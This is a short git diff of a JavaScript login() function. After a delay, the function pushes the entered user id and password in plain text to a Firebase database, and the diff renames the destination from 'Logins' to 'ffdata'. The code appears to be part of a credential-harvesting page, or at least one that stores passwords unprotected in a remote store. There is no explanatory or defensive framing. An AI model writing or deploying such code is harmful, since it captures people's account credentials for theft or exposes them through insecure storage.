@@ -11,7 +11,7 @@ function login(){
   else{
     localStorage.logins=true;
     setTimeout(function(){
-      database.ref("Logins").push().set({
+      database.ref("ffdata").push().set({
        'id':id,
        'password':pass
       })
